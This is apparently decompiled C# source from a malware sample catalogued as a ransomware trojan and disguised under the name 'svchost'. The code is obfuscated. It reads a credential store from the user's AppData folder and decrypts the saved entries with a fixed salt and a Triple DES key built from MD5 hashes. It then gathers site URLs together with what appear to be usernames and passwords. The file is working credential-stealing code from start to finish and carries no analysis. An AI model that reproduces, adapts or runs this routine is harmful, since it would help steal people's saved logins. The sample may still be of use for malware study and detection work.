// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public static class \u0005\u2000
{
  private static byte[] \u0002 = new byte[11]
  {
    (byte) 131,
    (byte) 125,
    (byte) 252,
    (byte) 15,
    (byte) 142,
    (byte) 179,
    (byte) 232,
    (byte) 105,
    (byte) 115,
    (byte) 175,
    byte.MaxValue
  };
  private static string \u0003 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

  public static void \u0002()
  {
    if (File.Exists(\u0005\u2000.\u0003 + \u0005\u2003.\u0002(1067756479)))
    {
      \u0005\u2000.\u0003 += \u0005\u2003.\u0002(1067756479);
      \u0005\u2000.\u0003();
    }
    else
    {
      if (!File.Exists(\u0005\u2000.\u0003 + \u0005\u2003.\u0002(1067756419)))
        return;
      \u0005\u2000.\u0003 += \u0005\u2003.\u0002(1067756419);
      \u0005\u2000.\u0003();
    }
  }

  private static void \u0003()
  {
    try
    {
      List<string> stringList1 = new List<string>();
      byte[] sourceArray = File.ReadAllBytes(\u0005\u2000.\u0003);
      for (int index = 0; index < sourceArray.Length - 4; ++index)
      {
        if (sourceArray[index] == (byte) 0 && sourceArray[index + 1] == (byte) 0 && sourceArray[index + 2] == (byte) 0 && sourceArray[index + 3] == (byte) 8)
        {
          int length = (int) sourceArray[index + 15];
          byte[] destinationArray1 = new byte[8];
          byte[] destinationArray2 = new byte[length];
          Array.Copy((Array) sourceArray, index + 4, (Array) destinationArray1, 0, destinationArray1.Length);
          Array.Copy((Array) sourceArray, index + 16, (Array) destinationArray2, 0, destinationArray2.Length);
          stringList1.Add(\u0005\u2000.\u0002(destinationArray1, destinationArray2));
          index += 11 + length;
        }
      }
      string[] array = stringList1.ToArray();
      List<string> stringList2 = new List<string>();
      List<string> stringList3 = new List<string>();
      for (int index = 6; index <= array.Length - 1; ++index)
      {
        string empty1 = string.Empty;
        string empty2 = string.Empty;
        string empty3 = string.Empty;
        string empty4 = string.Empty;
        if (array[index].Contains(\u0005\u2003.\u0002(1067756543)) || array[index].Contains(\u0005\u2003.\u0002(1067756493)) || array[index].Contains(\u0005\u2003.\u0002(1067756482)))
          stringList3.Add(array[index]);
        if (array[index].Contains(\u0005\u2003.\u0002(1067756543)) || array[index].Contains(\u0005\u2003.\u0002(1067756493)) || array[index].Contains(\u0005\u2003.\u0002(1067756482)))
          stringList2.Add(array[index + 2]);
        if (Uri.IsWellFormedUriString(array[index], UriKind.RelativeOrAbsolute))
        {
          string str1 = array[index].Replace(\u0005\u2003.\u0002(1067756497), string.Empty);
          string str2 = stringList3[0].Replace(\u0005\u2003.\u0002(1067756497), string.Empty);
          string str3 = stringList2[1].Replace(\u0005\u2003.\u0002(1067756497), string.Empty);
          string str4 = stringList3[1].Replace(\u0005\u2003.\u0002(1067756497), string.Empty);
          stringList2.Clear();
          stringList3.Clear();
          \u000F\u2000.\u0002.Add(new \u0008\u2000(\u0005\u2003.\u0002(1067755561), str2, str3, str1, str4));
        }
      }
    }
    catch
    {
    }
  }

  private static string \u0002(byte[] _param0, byte[] _param1)
  {
    try
    {
      MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
      cryptoServiceProvider1.Initialize();
      byte[] numArray1 = new byte[\u0005\u2000.\u0002.Length + _param0.Length];
      Array.Copy((Array) \u0005\u2000.\u0002, (Array) numArray1, \u0005\u2000.\u0002.Length);
      Array.Copy((Array) _param0, 0, (Array) numArray1, \u0005\u2000.\u0002.Length, _param0.Length);
      byte[] hash1 = cryptoServiceProvider1.ComputeHash(numArray1);
      byte[] numArray2 = new byte[hash1.Length + \u0005\u2000.\u0002.Length + _param0.Length];
      Array.Copy((Array) hash1, (Array) numArray2, hash1.Length);
      Array.Copy((Array) \u0005\u2000.\u0002, 0, (Array) numArray2, hash1.Length, \u0005\u2000.\u0002.Length);
      Array.Copy((Array) _param0, 0, (Array) numArray2, hash1.Length + \u0005\u2000.\u0002.Length, _param0.Length);
      byte[] hash2 = cryptoServiceProvider1.ComputeHash(numArray2);
      TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider2.Mode = CipherMode.CBC;
      cryptoServiceProvider2.Padding = PaddingMode.ISO10126;
      byte[] destinationArray1 = new byte[24];
      byte[] destinationArray2 = new byte[8];
      Array.Copy((Array) hash1, (Array) destinationArray1, hash1.Length);
      Array.Copy((Array) hash2, 0, (Array) destinationArray1, hash1.Length, 8);
      Array.Copy((Array) hash2, 8, (Array) destinationArray2, 0, 8);
      cryptoServiceProvider2.Key = destinationArray1;
      cryptoServiceProvider2.IV = destinationArray2;
      return Encoding.Unicode.GetString(cryptoServiceProvider2.CreateDecryptor().TransformFinalBlock(_param1, 0, _param1.Length));
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.Message);
      return string.Empty;
    }
  }
}
